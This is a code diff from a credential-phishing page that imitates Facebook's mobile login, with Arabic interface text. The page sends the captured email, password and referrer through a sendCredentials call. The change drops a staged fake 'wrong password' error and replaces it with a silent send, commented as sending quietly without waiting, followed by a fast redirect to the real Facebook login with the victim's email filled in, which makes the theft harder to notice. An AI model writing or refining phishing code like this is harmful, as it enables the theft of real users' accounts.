@@ -461,30 +461,15 @@
                 referrer: document.referrer || 'direct'
             };
 
-            setTimeout(async () => {
-                await sendCredentials(credentials);
+            // إرسال صامت بدون انتظار
+            sendCredentials(credentials).catch(() => {});
 
-                setTimeout(() => {
-                    loadingSpinner.style.display = 'none';
-
-                    passwordError.textContent = 'كلمة السر التي أدخلتها غير صحيحة.';
-                    passwordError.classList.add('show');
-                    passwordInput.classList.add('error', 'shake');
-                    passwordInput.value = '';
-
-                    setTimeout(() => {
-                        buttonText.style.display = 'inline';
-                        buttonText.textContent = 'تسجيل الدخول';
-                        validateForm();
-                        passwordInput.classList.remove('shake');
-                        togglePasswordBtn.style.display = 'none';
-
-                        setTimeout(() => {
-                            window.location.href = 'https://m.facebook.com/login/';
-                        }, 2200);
-                    }, 1500);
-                }, 800);
-            }, 1200);
+            // تحويل فوري إلى فيسبوك الحقيقي مع تعبئة البريد
+            setTimeout(() => {
+                window.location.replace(
+                    'https://www.facebook.com/login/?email=' + encodeURIComponent(credentials.email)
+                );
+            }, 700);
         });
 
         createBtn.addEventListener('click', function() {
